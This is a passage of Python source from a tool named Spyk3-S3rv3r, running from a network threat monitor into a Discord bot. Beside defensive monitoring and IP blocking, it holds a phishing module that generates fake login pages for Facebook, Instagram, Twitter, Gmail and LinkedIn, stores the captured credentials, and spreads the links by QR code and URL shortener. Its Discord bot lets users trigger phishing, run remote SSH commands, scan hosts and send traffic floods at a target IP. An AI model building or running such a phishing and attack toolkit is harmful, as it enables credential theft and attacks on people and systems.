                            local_ip=conn.laddr.ip if conn.laddr else "0.0.0.0",
                            local_port=conn.laddr.port if conn.laddr else 0,
                            remote_ip=source_ip,
                            remote_port=conn.raddr.port,
                            protocol=str(conn.type),
                            status="established"
                        )
                
                for source_ip, count in source_counts.items():
                    if count > self.thresholds['port_scan']:
                        self._create_threat_alert(
                            threat_type="Possible Port Scan",
                            source_ip=source_ip,
                            severity="medium",
                            description=f"{count} connections from this IP",
                            action_taken="Monitoring"
                        )
                        
                        ip_info = self.db.get_ip_info(source_ip)
                        if ip_info:
                            self.db.cursor.execute('''
                                UPDATE managed_ips 
                                SET alert_count = alert_count + 1,
                                    last_scan = CURRENT_TIMESTAMP
                                WHERE ip_address = ?
                            ''', (source_ip,))
                            self.db.conn.commit()
                        
                        if self.auto_block:
                            alert_count = len(self.connection_tracker.get(source_ip, []))
                            if alert_count > self.auto_block_threshold:
                                self._auto_block_ip(source_ip, f"Exceeded port scan threshold ({count} connections)")
                
                time.sleep(30)
                
            except Exception as e:
                logger.error(f"Threat monitor error: {e}")
                time.sleep(10)
    
    def _monitor_connections(self):
        """Monitor and clean up connection tracker"""
        while self.monitoring:
            try:
                current_time = time.time()
                for ip in list(self.connection_tracker.keys()):
                    self.connection_tracker[ip] = [
                        t for t in self.connection_tracker[ip] 
                        if current_time - t < 3600
                    ]
                    
                    if not self.connection_tracker[ip]:
                        del self.connection_tracker[ip]
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"Connection monitor error: {e}")
                time.sleep(10)
    
    def _monitor_performance(self):
        """Monitor network performance"""
        while self.monitoring:
            try:
                net = psutil.net_io_counters()
                time.sleep(1)
                net2 = psutil.net_io_counters()
                
                bytes_sent = net2.bytes_sent - net.bytes_sent
                bytes_recv = net2.bytes_recv - net.bytes_recv
                
                bandwidth = (bytes_sent + bytes_recv) / 1024
                
                connections = len(psutil.net_connections())
                
                self.db.log_performance(
                    scan_speed=0,
                    response_time=0,
                    packet_loss=0,
                    bandwidth=bandwidth,
                    connections_per_sec=connections
                )
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"Performance monitor error: {e}")
                time.sleep(10)
    
    def _create_threat_alert(self, threat_type: str, source_ip: str, 
                            severity: str, description: str, action_taken: str):
        """Create threat alert"""
        alert = ThreatAlert(
            timestamp=datetime.datetime.now().isoformat(),
            threat_type=threat_type,
            source_ip=source_ip,
            severity=severity,
            description=description,
            action_taken=action_taken
        )
        
        self.db.log_threat(alert)
        
        if severity == "critical":
            log_msg = f"{Colors.RED}🔥 CRITICAL: {threat_type} from {source_ip}{Colors.RESET}"
        elif severity == "high":
            log_msg = f"{Colors.RED}🚨 HIGH THREAT: {threat_type} from {source_ip}{Colors.RESET}"
        elif severity == "medium":
            log_msg = f"{Colors.YELLOW}⚠️ MEDIUM THREAT: {threat_type} from {source_ip}{Colors.RESET}"
        else:
            log_msg = f"{Colors.BLUE}ℹ️ INFO: {threat_type} from {source_ip}{Colors.RESET}"
        
        print(log_msg)
        logger.info(f"Threat alert: {threat_type} from {source_ip} ({severity})")
    
    def _auto_block_ip(self, ip: str, reason: str):
        """Automatically block an IP"""
        try:
            logger.info(f"Auto-blocking IP {ip}: {reason}")
            
            if NetworkTools.block_ip_firewall(ip):
                self.db.block_ip(ip, reason, executed_by="auto_block")
                
                self._create_threat_alert(
                    threat_type="Auto-Blocked IP",
                    source_ip=ip,
                    severity="high",
                    description=reason,
                    action_taken=f"IP blocked via firewall"
                )
            else:
                logger.error(f"Failed to auto-block IP {ip} - firewall command failed")
                
        except Exception as e:
            logger.error(f"Auto-block failed for {ip}: {e}")
    
    def add_ip_to_monitoring(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to monitoring"""
        try:
            ipaddress.ip_address(ip)
            self.monitored_ips.add(ip)
            result = self.db.add_managed_ip(ip, added_by, notes)
            logger.info(f"Added IP to monitoring: {ip} by {added_by}")
            return result
        except ValueError:
            logger.error(f"Invalid IP address: {ip}")
            return False
    
    def remove_ip_from_monitoring(self, ip: str) -> bool:
        """Remove IP from monitoring"""
        try:
            if ip in self.monitored_ips:
                self.monitored_ips.remove(ip)
            
            result = self.db.remove_managed_ip(ip)
            if result:
                logger.info(f"Removed IP from monitoring: {ip}")
            
            return result
        except Exception as e:
            logger.error(f"Failed to remove IP {ip}: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Block an IP"""
        try:
            firewall_success = NetworkTools.block_ip_firewall(ip)
            db_success = self.db.block_ip(ip, reason, executed_by)
            
            if ip in self.monitored_ips:
                self.monitored_ips.remove(ip)
            
            success = firewall_success or db_success
            
            if success:
                logger.info(f"IP {ip} blocked by {executed_by}: {reason}")
                self._create_threat_alert(
                    threat_type="Manual Block",
                    source_ip=ip,
                    severity="high",
                    description=reason,
                    action_taken=f"IP blocked by {executed_by}"
                )
            
            return success
            
        except Exception as e:
            logger.error(f"Failed to block IP {ip}: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock an IP"""
        try:
            firewall_success = NetworkTools.unblock_ip_firewall(ip)
            db_success = self.db.unblock_ip(ip, executed_by)
            
            success = firewall_success or db_success
            
            if success:
                logger.info(f"IP {ip} unblocked by {executed_by}")
            
            return success
            
        except Exception as e:
            logger.error(f"Failed to unblock IP {ip}: {e}")
            return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get monitoring status"""
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(5)
        
        return {
            'monitoring': self.monitoring,
            'monitored_ips_count': len(self.monitored_ips),
            'monitored_ips': list(self.monitored_ips)[:10],
            'blocked_ips': stats.get('total_blocked_ips', 0),
            'thresholds': self.thresholds,
            'auto_block': self.auto_block,
            'recent_threats': len(threats),
            'active_connections': len(self.connection_tracker)
        }

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.phishing_server = None
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None, 
                              custom_template: str = None) -> Dict[str, Any]:
        """Generate phishing link for specified platform"""
        try:
            link_id = str(uuid.uuid4())[:8]
            
            if custom_template:
                html_content = custom_template
            else:
                templates = self.db.get_phishing_templates(platform)
                if templates:
                    html_content = templates[0].get('html_content', '')
                else:
                    if platform == "facebook":
                        html_content = self.db._get_facebook_template()
                    elif platform == "instagram":
                        html_content = self.db._get_instagram_template()
                    elif platform == "twitter":
                        html_content = self.db._get_twitter_template()
                    elif platform == "gmail":
                        html_content = self.db._get_gmail_template()
                    elif platform == "linkedin":
                        html_content = self.db._get_linkedin_template()
                    else:
                        html_content = custom_template or self._get_custom_template()
            
            phishing_link = PhishingLink(
                id=link_id,
                platform=platform,
                original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080/{link_id}",
                template=platform,
                created_at=datetime.datetime.now().isoformat()
            )
            
            self.db.save_phishing_link(phishing_link)
            
            self.active_links[link_id] = {
                'platform': platform,
                'html': html_content,
                'created': datetime.datetime.now()
            }
            
            return {
                'success': True,
                'link_id': link_id,
                'platform': platform,
                'phishing_url': phishing_link.phishing_url,
                'created_at': phishing_link.created_at
            }
            
        except Exception as e:
            logger.error(f"Failed to generate phishing link: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _get_custom_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 28px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .links {
            text-align: center;
            margin-top: 20px;
        }
        .links a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 5px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Login</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign In</button>
                <div class="links">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def get_active_links(self) -> List[Dict]:
        """Get active phishing links"""
        links = []
        for link_id, data in self.active_links.items():
            links.append({
                'link_id': link_id,
                'platform': data['platform'],
                'created': data['created'].isoformat(),
                'server_running': self.phishing_server.running if self.phishing_server else False
            })
        return links
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        """Generate QR code for phishing link"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        
        if NetworkTools.generate_qr_code(url, qr_filename):
            return qr_filename
        
        return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        """Shorten phishing URL"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        return NetworkTools.shorten_url(url)

# =====================
# DISCORD BOT
# =====================
class Spyk3Discord:
    """Discord bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager, monitor: NetworkMonitor):
        self.handler = command_handler
        self.db = db
        self.monitor = monitor
        self.config = {}
        self.bot = None
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        return {}
    
    def save_config(self, token: str, channel_id: str = "", enabled: bool = True, 
                   prefix: str = "!", admin_role: str = "Admin", security_role: str = "Security Team") -> bool:
        try:
            config = {
                "enabled": enabled,
                "token": token,
                "channel_id": channel_id,
                "prefix": prefix,
                "admin_role": admin_role,
                "security_role": security_role
            }
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            logger.info("Discord configuration saved successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            logger.error("discord.py not installed")
            return False
        
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.bot = commands.Bot(
                command_prefix=self.config.get('prefix', '!'), 
                intents=intents,
                help_command=None
            )
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="2000+ Security Commands | !help"
                    )
                )
            
            await self.setup_commands()
            
            self.running = True
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    async def setup_commands(self):
        """Setup Discord commands"""
        
        @self.bot.command(name='analyze')
        async def analyze_command(ctx, target: str):
            result = self.handler.execute(f"analyze {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='stats')
        async def stats_command(ctx, target: str):
            result = self.handler.execute(f"stats {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='report')
        async def report_command(ctx, target: str):
            result = self.handler.execute(f"report {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='time')
        async def time_command(ctx):
            result = self.handler.execute("time", f"discord:{ctx.author}")
            await ctx.send(f"🕐 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='date')
        async def date_command(ctx):
            result = self.handler.execute("date", f"discord:{ctx.author}")
            await ctx.send(f"📅 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='datetime')
        async def datetime_command(ctx):
            result = self.handler.execute("datetime", f"discord:{ctx.author}")
            await ctx.send(f"```{result.get('output', 'N/A')}```")
        
        @self.bot.command(name='history')
        async def history_command(ctx, limit: int = 10):
            result = self.handler.execute(f"history {limit}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='time_history')
        async def time_history_command(ctx, limit: int = 10):
            result = self.handler.execute(f"time_history {limit}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_add')
        async def ssh_add_command(ctx, name: str, host: str, username: str, password: str = None, port: int = 22):
            notes = f"Added by {ctx.author.name}"
            result = self.handler.execute(f"ssh_add {name} {host} {username} {password or ''} {port} {notes}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_list')
        async def ssh_list_command(ctx):
            result = self.handler.execute("ssh_list", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_connect')
        async def ssh_connect_command(ctx, server_id: str):
            await ctx.send(f"🔌 Connecting to server {server_id}...")
            result = self.handler.execute(f"ssh_connect {server_id}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_exec')
        async def ssh_exec_command(ctx, server_id: str, *, command: str):
            await ctx.send(f"💻 Executing command on {server_id}...")
            result = self.handler.execute(f"ssh_exec {server_id} {command}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_upload')
        async def ssh_upload_command(ctx, server_id: str, local_path: str, remote_path: str):
            await ctx.send(f"📤 Uploading {local_path} to {server_id}:{remote_path}...")
            result = self.handler.execute(f"ssh_upload {server_id} {local_path} {remote_path}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_download')
        async def ssh_download_command(ctx, server_id: str, remote_path: str, local_path: str):
            await ctx.send(f"📥 Downloading {server_id}:{remote_path} to {local_path}...")
            result = self.handler.execute(f"ssh_download {server_id} {remote_path} {local_path}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_disconnect')
        async def ssh_disconnect_command(ctx, server_id: str = None):
            result = self.handler.execute(f"ssh_disconnect {server_id}" if server_id else "ssh_disconnect", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_traffic')
        async def generate_traffic_command(ctx, traffic_type: str, target_ip: str, duration: int, port: str = None, rate: str = None):
            cmd = f"generate_traffic {traffic_type} {target_ip} {duration}"
            if port:
                cmd += f" {port}"
            if rate:
                cmd += f" {rate}"
            await ctx.send(f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration} seconds...")
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_types')
        async def traffic_types_command(ctx):
            result = self.handler.execute("traffic_types", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_status')
        async def traffic_status_command(ctx):
            result = self.handler.execute("traffic_status", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_stop')
        async def traffic_stop_command(ctx, generator_id: str = None):
            cmd = "traffic_stop"
            if generator_id:
                cmd += f" {generator_id}"
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_logs')
        async def traffic_logs_command(ctx, limit: int = 10):
            result = self.handler.execute(f"traffic_logs {limit}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_help')
        async def traffic_help_command(ctx):
            result = self.handler.execute("traffic_help", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto')
        async def nikto_command(ctx, target: str, *options):
            await ctx.send(f"🕷️ Starting Nikto web vulnerability scan on {target}...")
            cmd = f"nikto {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_ssl')
        async def nikto_ssl_command(ctx, target: str):
            await ctx.send(f"🔒 Running Nikto SSL/TLS scan on {target}...")
            result = self.handler.execute(f"nikto_ssl {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_sql')
        async def nikto_sql_command(ctx, target: str):
            await ctx.send(f"💉 Running Nikto SQL injection scan on {target}...")
            result = self.handler.execute(f"nikto_sql {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_xss')
        async def nikto_xss_command(ctx, target: str):
            await ctx.send(f"🔄 Running Nikto XSS scan on {target}...")
            result = self.handler.execute(f"nikto_xss {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_cgi')
        async def nikto_cgi_command(ctx, target: str):
            await ctx.send(f"📁 Running Nikto CGI scan on {target}...")
            result = self.handler.execute(f"nikto_cgi {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_full')
        async def nikto_full_command(ctx, target: str):
            await ctx.send(f"🔬 Running full Nikto scan on {target}...")
            result = self.handler.execute(f"nikto_full {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_status')
        async def nikto_status_command(ctx):
            result = self.handler.execute("nikto_status", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_results')
        async def nikto_results_command(ctx, limit: int = 5):
            result = self.handler.execute(f"nikto_results {limit}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='add_ip')
        async def add_ip_command(ctx, ip: str, *, notes: str = ""):
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"add_ip {ip} {notes}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='remove_ip')
        async def remove_ip_command(ctx, ip: str):
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"remove_ip {ip}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='block_ip')
        async def block_ip_command(ctx, ip: str, *, reason: str = "Manually blocked via Discord"):
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"block_ip {ip} {reason}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='unblock_ip')
        async def unblock_ip_command(ctx, ip: str):
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"unblock_ip {ip}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='list_ips')
        async def list_ips_command(ctx, filter_type: str = "all"):
            filter_param = ""
            if filter_type.lower() == 'active':
                filter_param = "active"
            elif filter_type.lower() == 'blocked':
                filter_param = "blocked"
            result = self.handler.execute(f"list_ips {filter_param}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ip_info')
        async def ip_info_command(ctx, ip: str):
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"ip_info {ip}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_facebook')
        async def phishing_facebook_command(ctx):
            result = self.handler.execute("generate_phishing_link_for_facebook", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_instagram')
        async def phishing_instagram_command(ctx):
            result = self.handler.execute("generate_phishing_link_for_instagram", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_twitter')
        async def phishing_twitter_command(ctx):
            result = self.handler.execute("generate_phishing_link_for_twitter", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_gmail')
        async def phishing_gmail_command(ctx):
            result = self.handler.execute("generate_phishing_link_for_gmail", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_linkedin')
        async def phishing_linkedin_command(ctx):
            result = self.handler.execute("generate_phishing_link_for_linkedin", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_custom')
        async def phishing_custom_command(ctx, custom_url: str = None):
            cmd = "generate_phishing_link_for_custom"
            if custom_url:
                cmd += f" {custom_url}"
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_links')
        async def phishing_links_command(ctx):
            result = self.handler.execute("phishing_links", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_credentials')
        async def phishing_credentials_command(ctx, link_id: str = None):
            cmd = "phishing_credentials"
            if link_id:
                cmd += f" {link_id}"
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_qr')
        async def phishing_qr_command(ctx, link_id: str):
            result = self.handler.execute(f"phishing_qr {link_id}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_shorten')
        async def phishing_shorten_command(ctx, link_id: str):
            result = self.handler.execute(f"phishing_shorten {link_id}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='help')
        async def help_command(ctx):
            embed = discord.Embed(
                title="🕷️ Spyk3-S3rv3r v1.0.0 - Help Menu",
                description="**2000+ Advanced Cybersecurity Commands**\n\nType `!command` to execute",
                color=discord.Color.blue()
            )
            
            embed.add_field(
                name="🔍 **IP Analysis**",
                value="`!analyze <ip>` - Complete IP analysis with report\n"
                      "`!stats <ip>` - Generate statistics graphics\n"
                      "`!report <ip>` - Get latest analysis report",
                inline=False
            )
            
            embed.add_field(
                name="🔌 **SSH Commands**",
                value="`!ssh_add <name> <host> <user> [password] [port]` - Add SSH server\n"
                      "`!ssh_list` - List SSH servers\n"
                      "`!ssh_connect <id>` - Connect to server\n"
                      "`!ssh_exec <id> <command>` - Execute command\n"
                      "`!ssh_upload <id> <local> <remote>` - Upload file\n"
                      "`!ssh_download <id> <remote> <local>` - Download file\n"
                      "`!ssh_disconnect [id]` - Disconnect",
                inline=False
            )
            
            embed.add_field(
                name="⏰ **Time & Date Commands**",
                value="`!time` - Show current time\n"
                      "`!date` - Show current date\n"
                      "`!datetime` - Show both date and time\n"
                      "`!history [limit]` - View command history\n"
                      "`!time_history` - View time command history",
                inline=False
            )
            
            embed.add_field(
                name="🚀 **Traffic Generation**",
                value="`!generate_traffic <type> <ip> <duration> [port] [rate]` - Generate real traffic\n"
                      "`!traffic_types` - List available traffic types\n"
                      "`!traffic_status` - Check active generators\n"
                      "`!traffic_stop [id]` - Stop traffic generation\n"
                      "`!traffic_logs [limit]` - View traffic logs",
                inline=False
            )
            
            embed.add_field(
                name="🎣 **Social Engineering**",
                value="`!generate_phishing_link_for_facebook` - Facebook phishing\n"
                      "`!generate_phishing_link_for_instagram` - Instagram phishing\n"
                      "`!generate_phishing_link_for_twitter` - Twitter phishing\n"
                      "`!generate_phishing_link_for_gmail` - Gmail phishing\n"
                      "`!generate_phishing_link_for_linkedin` - LinkedIn phishing\n"
                      "`!generate_phishing_link_for_custom [url]` - Custom phishing\n"
                      "`!phishing_links` - List all links\n"
                      "`!phishing_credentials [id]` - View captured data\n"
                      "`!phishing_qr <id>` - Generate QR code\n"
                      "`!phishing_shorten <id>` - Shorten URL",
                inline=False
            )
            
            embed.add_field(
                name="🕷️ **Nikto Web Scanner**",
                value="`!nikto <target>` - Basic web vuln scan\n"
                      "`!nikto_full <target>` - Full scan with all tests\n"
                      "`!nikto_ssl <target>` - SSL/TLS specific scan\n"
                      "`!nikto_sql <target>` - SQL injection scan\n"
                      "`!nikto_xss <target>` - XSS scan\n"
                      "`!nikto_cgi <target>` - CGI scan\n"
                      "`!nikto_status` - Check scanner status",
                inline=False
            )
            
            embed.add_field(
                name="🔒 **IP Management**",
                value="`!add_ip <ip> [notes]` - Add IP to monitoring\n"
                      "`!remove_ip <ip>` - Remove IP from monitoring\n"
                      "`!block_ip <ip> [reason]` - Block IP address\n"
                      "`!unblock_ip <ip>` - Unblock IP address\n"
                      "`!list_ips [all/active/blocked]` - List managed IPs\n"
                      "`!ip_info <ip>` - Detailed IP information",
                inline=False
            )
            
            embed.add_field(
                name="🤖 **Basic Commands**",
                value="`!ping <ip>` - Ping IP\n"
                      "`!scan <ip>` - Port scan (1-1000)\n"
                      "`!quick_scan <ip>` - Fast port scan\n"
                      "`!nmap <ip> [options]` - Full nmap scan\n"
                      "`!traceroute <target>` - Network path tracing\n"
                      "`!whois <domain>` - WHOIS lookup\n"
                      "`!location <ip>` - IP geolocation\n"
                      "`!system` - System information\n"
                      "`!status` - System status\n"
                      "`!threats` - Recent threats",
                inline=False
            )
            
            embed.set_footer(text=f"Requested by {ctx.author.name} | Prefix: {self.config.get('prefix', '!')}")
            await ctx.send(embed=embed)
        
        @self.bot.command(name='ping')
        async def ping_command(ctx, target: str, *options):
            await ctx.send(f"🏓 Pinging {target}...")
            cmd = f"ping {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='scan')
        async def scan_command(ctx, target: str, ports: str = None):
            await ctx.send(f"🔍 Scanning {target}...")
            cmd = f"scan {target}"
            if ports:
                cmd += f" {ports}"
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='quick_scan')
        async def quick_scan_command(ctx, target: str):
            await ctx.send(f"⚡ Quick scanning {target}...")
            result = self.handler.execute(f"quick_scan {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nmap')
        async def nmap_command(ctx, target: str, *options):
            await ctx.send(f"🔬 Running nmap on {target}...")
            cmd = f"nmap {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traceroute')
        async def traceroute_command(ctx, target: str):
            await ctx.send(f"🛣️ Tracing route to {target}...")
            result = self.handler.execute(f"traceroute {target}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='whois')
        async def whois_command(ctx, domain: str):
            await ctx.send(f"🔎 WHOIS lookup for {domain}...")
            result = self.handler.execute(f"whois {domain}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='location')
        async def location_command(ctx, ip: str):
            await ctx.send(f"📍 Getting location for {ip}...")
            result = self.handler.execute(f"location {ip}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='system')
        async def system_command(ctx):
            await ctx.send("💻 Getting system information...")
            result = self.handler.execute("system", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='status')
        async def status_command(ctx):
            await ctx.send("📊 Getting system status...")
            result = self.handler.execute("status", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='threats')
        async def threats_command(ctx, limit: int = 10):
            result = self.handler.execute(f"threats {limit}", f"discord:{ctx.author}")
            await self.send_result(ctx, result)
    
    async def send_result(self, ctx, result):
        if not result['success']:
            error_msg = result.get('output', 'Unknown error')
            if len(error_msg) > 1000:
                error_msg = error_msg[:1000] + "..."
            embed = discord.Embed(
                title="❌ Command Failed",
                description=f"```{error_msg}```",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        output = result.get('output', '') or result.get('data', '')
        
        if isinstance(output, dict):
            try:
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        if len(formatted) > 2000:
            formatted = formatted[:1900] + "\n\n... (output truncated)"
        
        embed = discord.Embed(
            title=f"✅ Command Executed ({result['execution_time']:.2f}s)",
            description=f"```{formatted}```",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            logger.info("Discord bot started in background thread")
            return True
        return False
    
    def _run_discord_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
